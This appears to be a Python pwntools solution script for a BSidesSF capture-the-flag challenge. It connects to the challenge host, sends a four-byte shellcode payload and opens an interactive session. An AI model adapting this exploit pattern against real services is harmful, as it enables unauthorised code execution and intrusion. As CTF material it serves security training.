from pwn import *

#p = process('./shortest')
p = remote('i-am-the-shortest-6d15ba72.ctf.bsidessf.net', 8890)

raw_input()

print p.recv()

p.send('\x89\xf1\x0f\x34')

print p.recv()
p.interactive()